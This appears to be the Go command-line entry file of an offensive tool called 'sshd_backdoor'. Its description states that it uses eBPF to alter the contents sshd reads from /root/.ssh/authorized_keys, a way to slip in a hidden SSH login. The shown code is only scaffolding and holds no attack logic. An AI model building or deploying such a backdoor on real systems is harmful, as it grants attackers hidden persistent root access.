package sshd_backdoor

import (
	_ "embed"
	"github.com/spf13/cobra"
)

//go:embed banner
var Banner string

var RootCmd = &cobra.Command{
	Use:   "sshd_backdoor",
	Short: "sshd_backdoor is evil file watchdog who changes file content when sshd reads /root/.ssh/authorized_keys using ebpf",
	Long:  Banner,
	PersistentPreRun: func(cmd *cobra.Command, args []string) {
		// For Sure this will run.
	},
}
